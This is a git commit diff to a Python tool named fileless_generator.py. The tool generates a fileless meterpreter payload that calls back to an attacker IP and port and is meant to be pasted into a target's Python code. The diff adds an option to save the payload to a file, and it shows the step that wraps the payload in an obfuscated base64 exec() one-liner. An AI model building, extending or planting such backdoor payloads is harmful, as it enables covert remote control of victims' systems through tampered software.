c06fecd3bdf64af630c60264c15e5eafa8782481
rocknroll <gon1397@naver.com>
2024-12-19 18:15:23 +0900

    feat:Added file write

--- fileless_generator.py
+++ fileless_generator.py
@@ -7,7 +7,8 @@ This script generates a fileless payload that can be used to execute a meterpret
 The generated code should be pasted in the target python code.
 
 Example:
-python3 fileless_generator.py <IP> <PORT> [-a] [-t]
+python3 fileless_generator.py <IP> <PORT> [-a] [-t] [-e] [-o <OUTPUT FILE>]
+python3 fileless_generator.py <IP> <PORT> [--admin] [--threading] [--encoding] [--output <OUTPUT FILE>]
 
 Arguments:
 <IP>: IP address of the attacker machine.
@@ -15,6 +16,7 @@ Arguments:
 -a or --admin: Include admin feature code.
 -t or --threading: Include threading code.
 -e or --encoding: Include base64 encoding.
+-o or --output: Output file to save the code.
 -h or --help: Show this help message.
 """
 parser = argparse.ArgumentParser(description='Generate a fileless payload.', epilog=HELP_MESSAGE, formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -23,6 +25,7 @@ parser.add_argument('port', type=int, help='Port number')
 parser.add_argument('-a', '--admin', action='store_true', help='Include admin path')
 parser.add_argument('-t', '--threading', action='store_true', help='Include threading')
 parser.add_argument('-e', '--encoding', action='store_true', help='Include base64 encoding')
+parser.add_argument('-o', '--output', type=str, help='Output file to save the code')
 
 
 args = parser.parse_args()
@@ -41,6 +44,10 @@ if args.encoding:
     encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
     command = f"exec(__import__('base64').b64decode('{encoded_command}').decode('utf-8'))"
 
-print("Copy the following code and paste it in the target python code:")
-print("================================================================")
-print(command)
+if args.output:
+    with open(args.output, 'w') as f:
+        f.write(command)
+else:
+    print("Copy the following code and paste it in the target python code:")
+    print("================================================================")
+    print(command)
